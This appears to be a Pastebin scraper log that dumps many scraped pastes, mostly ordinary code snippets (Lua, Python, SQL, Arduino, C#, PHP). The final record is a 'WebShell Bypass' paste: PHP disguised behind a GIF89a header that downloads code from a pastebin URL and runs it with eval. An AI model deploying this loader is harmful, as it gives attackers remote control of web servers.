""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/6b51c479-cc1e-fce8-eb8e-d5ebb284f573.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-19-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/086b736f-ce8e-0f52-536f-de3948a124d5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-20-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/25d5694a-547f-bf87-4a7e-ac2d298919c5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-21-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e3510150-88ed-2a16-96a6-ef04a2bf1cc1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-23-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/245f4569-ec96-4886-cf5b-4363568a3755.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-24-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3d57ce55-4d37-3f79-226e-ff286d55df1f.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-25-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8f1da29d-52f0-b2db-7863-3a07da55dfb6.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-26-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/14d1713b-a1b3-7aed-43a9-5a69fbf3b086.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-27-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/99ae159e-0f65-068c-f497-90d8099dbfe7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-28-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/35d2b851-dbde-a53b-1a61-e2522de7e105.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-30-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/06bb83b9-8fde-d386-fbda-7722f03aed7b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-31-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/8d1297e7-0646-c732-8d23-7d492f943050.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 }\n]', date='2022-06-01 07:12:11 +00:00', hash_val='bd484a995d3e11682568b8e63a18171e', url='/10iPX6E0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Kitsumi', title='[GMod] Chat Net', content='util.AddNetworkString(""subscribe:chat_net"")\nutil.AddNetworkString(""unsubscribe:chat_net"")\nutil.AddNetworkString(""chat_net"")\n\xa0\nlocal subscribers = {}\n\xa0\nnet.Receive(""subscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if not table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 subscribers[#subscribers + 1] = ply\n\xa0 \xa0 end\nend)\n\xa0\nnet.Receive(""unsubscribe:chat_net"", function(len, ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)\n\xa0\nhook.Add(""PlayerSay"", ""chat_net_msg"", function(ply, text, team)\n\xa0 \xa0 net.Start(""chat_net"")\n\xa0 \xa0 net.WriteEntity(ply)\n\xa0 \xa0 net.WriteString(text)\n\xa0 \xa0 net.WriteBool(team)\n\xa0 \xa0 local receivers = {}\n\xa0 \xa0 for idx, receiver in ipairs(subscribers) do\n\xa0 \xa0 \xa0 \xa0 if (team and receiver:Team() == ply:Team()) or (not Team) then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 receivers[#receivers + 1] = receiver\n\xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 end\n\xa0 \xa0 net.Send(receivers)\nend)\n\xa0\nhook.Add(""PlayerDisconnected"", ""chat_net_msg_remove_players"", function(ply)\n\xa0 \xa0 if table.HasValue(subscribers, ply) then\n\xa0 \xa0 \xa0 \xa0 table.RemoveByValue(subscribers, ply)\n\xa0 \xa0 end\nend)', date='2022-06-01 07:06:50 +00:00', hash_val='a801d7923ca3dc7f98e7b34336083d09', url='/VMpNcgiY', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='askanton', title='Python pop3 mail', content='import poplib\n\xa0\nfrom email.parser import BytesParser\nfrom email.policy import default\nimport os\npop3server = \'0.0.0.0\'\nusername = \'qqqqq@qqqqq.qqq.qqq\'\npassword = \'qqqqqqq\'\n\xa0\npop3server = poplib.POP3(pop3server) \xa0# 110\n# pop3server = poplib.POP3_SSL(pop3server) # 995\n\xa0\nprint(pop3server.getwelcome()) \xa0# show welcome message\npop3server.user(username)\npop3server.pass_(password)\npop3info = pop3server.stat() \xa0# access mailbox status\nmailcount = pop3info[0] \xa0# toral email\nprint(mailcount)\nprint(""Total no. of Email : "" , mailcount)\nprint (""\\n\\nStart Reading Messages\\n\\n"")\nfor i in range(mailcount):\n\xa0 \xa0 os.mkdir(""{}"".format(i))\n\xa0 \xa0 for message in pop3server.retr(i+1)[1]:\n\xa0 \xa0 \xa0 \xa0 my_file = open(""{}/mail{}.txt"".format(i,i), ""a"")\n\xa0 \xa0 \xa0 \xa0 my_file.write(str(message) + ""\\n"")\n\xa0 \xa0 print(""*************************************************************************************************"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0\npop3server.quit()', date='2022-06-01 06:58:04 +00:00', hash_val='82d04af5c9c0649a9ef281803642d091', url='/qzNiTNTG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')})]
2022-06-01T17:08:14.958227+0300 INFO [PASTEBIN]    saved /kEQRsKq0 
2022-06-01T17:08:14.959078+0300 INFO [PASTEBIN]    saved /XJ1Tt0Dd 
2022-06-01T17:08:14.959604+0300 INFO [PASTEBIN]    saved /2nz8WBMX 
2022-06-01T17:08:14.959894+0300 INFO [PASTEBIN]    saved /XxXav8r9 
2022-06-01T17:08:14.960693+0300 INFO [PASTEBIN]    saved /sAgz7Jas 
2022-06-01T17:08:14.960987+0300 INFO [PASTEBIN]    saved /6XtvDpbC 
2022-06-01T17:08:14.961268+0300 INFO [PASTEBIN]    saved /S6BumVkC 
2022-06-01T17:08:14.961550+0300 INFO [PASTEBIN]    saved /nFymAiMC 
2022-06-01T17:08:14.962348+0300 INFO [PASTEBIN]    saved /CFxHbqkU 
2022-06-01T17:08:14.962640+0300 INFO [PASTEBIN]    saved /vAC6sJ5X 
2022-06-01T17:08:14.962919+0300 INFO [PASTEBIN]    saved /EbtiverJ 
2022-06-01T17:08:14.963196+0300 INFO [PASTEBIN]    saved /a22PZrCN 
2022-06-01T17:08:14.963470+0300 INFO [PASTEBIN]    saved /xQHPkXSh 
2022-06-01T17:08:14.963743+0300 INFO [PASTEBIN]    saved /KkH3NTqf 
2022-06-01T17:08:14.964015+0300 INFO [PASTEBIN]    saved /A5PrM16v 
2022-06-01T17:08:14.964288+0300 INFO [PASTEBIN]    saved /27LLDR46 
2022-06-01T17:08:14.964561+0300 INFO [PASTEBIN]    saved /QLzUVVFP 
2022-06-01T17:08:14.964833+0300 INFO [PASTEBIN]    saved /mVANj5R8 
2022-06-01T17:08:14.965106+0300 INFO [PASTEBIN]    saved /3Gh74aqt 
2022-06-01T17:08:14.965378+0300 INFO [PASTEBIN]    saved /3uzkDY3Q 
2022-06-01T17:08:14.965673+0300 INFO [PASTEBIN]    saved /Sw34xvVF 
2022-06-01T17:08:14.966487+0300 INFO [PASTEBIN]    saved /zcntj0cc 
2022-06-01T17:08:14.966981+0300 INFO [PASTEBIN]    saved /meip76d6 
2022-06-01T17:08:14.967451+0300 INFO [PASTEBIN]    saved /SxuLkrXK 
2022-06-01T17:08:14.967890+0300 INFO [PASTEBIN]    saved /yyXjmkkd 
2022-06-01T17:08:14.968327+0300 INFO [PASTEBIN]    saved /me0WmRP2 
2022-06-01T17:08:14.968779+0300 INFO [PASTEBIN]    saved /cGVcumWu 
2022-06-01T17:08:14.969212+0300 INFO [PASTEBIN]    saved /Eb9uukQC 
2022-06-01T17:08:14.969643+0300 INFO [PASTEBIN]    saved /1c8LP5ed 
2022-06-01T17:08:14.970075+0300 INFO [PASTEBIN]    saved /265imbAB 
2022-06-01T17:08:14.970477+0300 INFO [PASTEBIN]    saved /HmxfrnRy 
2022-06-01T17:08:14.970854+0300 INFO [PASTEBIN]    saved /CtwGnkGJ 
2022-06-01T17:08:14.971605+0300 INFO [PASTEBIN]    saved /RcUN0MQm 
2022-06-01T17:08:14.972148+0300 INFO [PASTEBIN]    saved /Ne4dJZVF 
2022-06-01T17:08:14.972553+0300 INFO [PASTEBIN]    saved /QtqFRCg5 
2022-06-01T17:08:14.972956+0300 INFO [PASTEBIN]    saved /C4b3ZKSG 
2022-06-01T17:08:14.973362+0300 INFO [PASTEBIN]    saved /WDAvn4HM 
2022-06-01T17:08:14.973772+0300 INFO [PASTEBIN]    saved /n3KceSd6 
2022-06-01T17:08:14.974288+0300 INFO [PASTEBIN]    saved /pUcaN6zw 
2022-06-01T17:08:14.974808+0300 INFO [PASTEBIN]    saved /qdR5zyy2 
2022-06-01T17:08:14.975209+0300 INFO [PASTEBIN]    saved /rcX9dTCJ 
2022-06-01T17:08:14.975649+0300 INFO [PASTEBIN]    saved /2iPjcm3r 
2022-06-01T17:08:14.975945+0300 INFO [PASTEBIN]    saved /srQ8CL61 
2022-06-01T17:08:14.976513+0300 INFO [PASTEBIN]    saved /r0EmaSbG 
2022-06-01T17:08:14.976931+0300 INFO [PASTEBIN]    saved /CYkqZSc5 
2022-06-01T17:08:14.977457+0300 INFO [PASTEBIN]    saved /qAebbKk4 
2022-06-01T17:08:14.977978+0300 INFO [PASTEBIN]    saved /A2nuM6yG 
2022-06-01T17:08:14.978496+0300 INFO [PASTEBIN]    saved /10iPX6E0 
2022-06-01T17:08:14.978896+0300 INFO [PASTEBIN]    saved /VMpNcgiY 
2022-06-01T17:08:14.979296+0300 INFO [PASTEBIN]    saved /qzNiTNTG 
2022-06-01T17:08:34.822435+0300 INFO [PASTEBIN] got 50 new tasks
2022-06-01T17:08:34.822435+0300 INFO [PASTEBIN] got 50 new tasks
2022-06-01T17:08:34.825936+0300 DEBUG [PASTEBIN] problem with data [DataStructure(author='Maks140888', title='Untitled', content="create or replace function find_first_childs (obj_x VARCHAR2) \nreturn objects_below as first_childs objects_below;\nbegin \n\xa0 \xa0 select LPAD(' ', 5*level)||objects.name \n\xa0 \xa0 BULK COLLECT into first_childs\n\xa0 \xa0 FROM objects JOIN object_types USING (object_type_id)\n\xa0 \xa0 where level < (\n\xa0 \xa0 \xa0 \xa0 select level from objects where name = obj_x\n\xa0 \xa0 \xa0 \xa0 start with parent_id is null CONNECT by prior object_id = parent_id\n\xa0 \xa0 \xa0 \xa0 ) + 1\n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 \xa0 \xa0 CONNECT by prior objects.object_id = objects.parent_id;\n\xa0 \xa0 \n\xa0 \xa0 return first_childs;\nend;\n\xa0\nselect * from find_first_childs('ін-94-1');", date='2022-06-01 14:05:13 +00:00', hash_val='b41aca26982dbdf9bd73e9f30bf25f21', url='/kEQRsKq0', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='AshfaqFardin', title='blink', content='//define\n#define Led 13\n\xa0\n//setup\nvoid setup(){\n\xa0 \xa0 Serial.begin(9600);\n\xa0 \xa0 pinMode(Led, OUTPUT);\n}\n\xa0\n//main\nvoid loop(){\n\xa0 \xa0 digitalWrite(Led, HIGH);\n\xa0 \xa0 delay(2000);\n\xa0 \xa0 digitalWrite(Led, LOW);\n\xa0 \xa0 delay(2000);\n}', date='2022-06-01 14:03:20 +00:00', hash_val='a56b840038d9e0e1663c1e5801f61237', url='/XJ1Tt0Dd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\n\xa0\nnamespace Hot_Potato\n{\n\xa0 \xa0 class HotPotato\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> kids = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int multiplicity = int.Parse(Console.ReadLine());\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int curent = 0;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while (kids.Count > 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent++;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 string kid = kids.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!(curent % multiplicity).Equals(0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 kids.Enqueue(kid);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Removed {kid}"");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent = 0;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Last is {kids.Dequeue()}"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 14:01:56 +00:00', hash_val='c40603729d473be6461eb00f94dedb74', url='/2nz8WBMX', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dunyto', title='Create Report', content='function generateReport() {\n\xa0 \xa0 let cbs = document.querySelectorAll(""thead tr th input"");\n\xa0 \xa0 let colPos = [];\n\xa0 \xa0 for (let i = 0; i < cbs.length; i ++) {\n\xa0 \xa0 \xa0 \xa0 if (cbs[i].checked) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 colPos.push(i);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let finalResult = [];\n\xa0\n\xa0 \xa0 let data = document.querySelectorAll(""tbody tr"");\n\xa0 \xa0 for (let j = 0; j < data.length; j ++) {\n\xa0 \xa0 \xa0 \xa0 let currRow = data[j].children;\n\xa0 \xa0 \xa0 \xa0 let currItems = {};\n\xa0 \xa0 \xa0 \xa0 for (let k = 0; k < currRow.length; k ++) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (colPos.includes(k)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let label = cbs[k].name;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currItems[label] = currRow[k].textContent;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 finalResult.push(currItems);\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let jsonFinal = JSON.stringify(finalResult);\n\xa0 \xa0 let target = document.getElementById(\'output\');\n\xa0 \xa0 target.value = jsonFinal;\n}', date='2022-06-01 13:59:57 +00:00', hash_val='cf8530010b5f97ab0fca43fd8e6f8846', url='/XxXav8r9', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='sugab', title='Consume API Edit PHP', content='<?php\ninclude \'inc.php\';\n\xa0\nif (!empty($_POST[\'nim\'])) {\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $url = $api_url. \'?nim=\' . $nim;;\n\xa0\n\xa0 $postdata = array();\n\xa0 $postdata[\'nama\'] = $_POST[\'nama\'];\n\xa0 $postdata[\'angkatan\'] = $_POST[\'angkatan\'];\n\xa0 $postdata[\'semester\'] = $_POST[\'semester\'];\n\xa0 $postdata[\'ipk\'] = $_POST[\'ipk\'];\n\xa0 $postdata[\'email\'] = $_POST[\'email\'];\n\xa0 $postdata[\'telepon\'] = $_POST[\'telepon\'];\n\xa0 $json = json_encode($postdata);\n\xa0\n\xa0 $ch = curl_init();\n\xa0 curl_setopt($ch, CURLOPT_URL, $url);\n\xa0 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, ""PUT"");\n\xa0 curl_setopt($ch, CURLOPT_HTTPHEADER, array(\'Content-Type: appplication/json\'));\n\xa0 curl_setopt($ch, CURLOPT_POSTFIELDS, $json);\n\xa0 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n\xa0\n\xa0 $response = curl_exec($ch);\n\xa0 curl_close($ch);\n\xa0\n\xa0 header(\'location:index.php\');\n\xa0 exit();\n}\n?>\n\xa0\n<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"">\n<html>\n\xa0\n<head>\n\xa0 <!-- BOOTSTRAP -->\n\xa0 <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"" integrity=""sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS"" crossorigin=""anonymous"">\n\xa0 <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"" integrity=""sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://code.jquery.com/jquery-3.3.1.slim.min.js"" integrity=""sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"" integrity=""sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"" crossorigin=""anonymous""></script>\n\xa0 <title>Data Mahasiswa Politeknik</title>\n</head>\n\xa0\n<body>\n\xa0 <nav class=""navbar navbar-expand-lg navbar-light bg-light justify-content-between"">\n\xa0 \xa0 <a class=""navbar-brand"" href=""#"">\n\xa0 \xa0 \xa0 <img src=""img/logo.png"" width=""60"" height=""60"" alt="""">\n\xa0 \xa0 </a>\n\xa0 \xa0 <h1>Data Mahasiswa Politeknik</h1>\n\xa0 \xa0 <a href=""index.php"">\n\xa0 \xa0 \xa0 <button type=""button btn-lg"" class=""btn btn-success btn-sm"">Back</button>\n\xa0 \xa0 </a>\n\xa0 </nav>\n\xa0\n\xa0 <?php\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $api_mahasiswa = $api_url . \'?nim=\' . $nim;\n\xa0 $json_detail = @file_get_contents($api_mahasiswa);\n\xa0 $arr_detail = json_decode($json_detail, true);\n\xa0 $result = isset($arr_detail[\'data\']) ? $arr_detail[\'data\'] : array();\n\xa0 $data = $result[0];\n\xa0 ?>\n\xa0 <div class=""col-4""></div>\n\xa0 <div class=""container col-4 my-3"">\n\xa0 \xa0 <h3>Edit Data Mahasiswa</h3>\n\xa0 \xa0 <form method=""POST"" action="""">\n\xa0 \xa0 \xa0 <input type=""hidden"" name=""nim"" value=""<?php echo $data[\'nim\']; ?>"" />\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>NIM</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nim"" class=""form-control"" value=""<?php echo $data[\'nim\']; ?>"" readonly>\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Nama</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nama"" class=""form-control"" value=""<?php echo $data[\'nama\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Angkatan</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""angkatan"" class=""form-control"" value=""<?php echo $data[\'angkatan\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Semester</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""semester"" class=""form-control"" value=""<?php echo $data[\'semester\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>IPK</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""ipk"" class=""form-control"" value=""<?php echo $data[\'ipk\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Email</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""email"" class=""form-control"" value=""<?php echo $data[\'email\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Telepon</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""telepon"" class=""form-control"" value=""<?php echo $data[\'telepon\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div>\n\xa0 \xa0 \xa0 \xa0 <button class=""btn btn-success"" name=""submit"" type=""submit"">Submit Data</button>\n\xa0 \xa0 \xa0 </div>\n\xa0 \xa0 </form>\n\xa0 </div>\n\xa0 <div class=""col-4""></div>\n\xa0\n</body>\n\xa0\n</html>', date='2022-06-01 13:53:01 +00:00', hash_val='e23a311fb08bb1d7fcb5bb826a8b4c1d', url='/sAgz7Jas', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="delete from objects\nwhere name = 'Томас Шелби'\n\xa0\nINSERT INTO objects VALUES (100, 50, 15, 'Томас Шелби')", date='2022-06-01 13:49:33 +00:00', hash_val='9e40e7a0737cf3168037aa88b0c67dc2', url='/6XtvDpbC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='willysec_id', title='MI77I-X WebShell Bypass', content="Gif89a\n<?php $c=&$cv;$cv='https://pastebin.com/raw/jePRQN8t';$b=file_get_contents($c);@eval('?>'.'/******/'.$b);", date='2022-06-01 13:37:58 +00:00', hash_val='ee758ec64e1ac541c32118c3b9c6585e', 